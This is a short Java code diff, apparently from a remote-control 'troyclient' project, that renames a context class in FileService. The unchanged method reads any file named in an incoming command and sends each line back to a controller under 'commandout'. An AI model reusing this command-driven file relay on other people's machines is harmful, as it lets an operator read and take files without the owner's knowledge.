@@ -1,6 +1,6 @@
 package ch.lebois.troyclient.service;
 
-import ch.lebois.troyclient.main.GetContext;
+import ch.lebois.troyclient.main.SystemVariables;
 import com.google.common.io.Files;
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -22,7 +22,7 @@ public class FileService {
     public static void readFile(String command) {
         FileService fileHandler = new FileService(command.substring(5));
         for (String row : fileHandler.readRows()) {
-            GetContext.SENDER.send("commandout", row);
+            SystemVariables.SENDER.send("commandout", row);
         }
     }
 
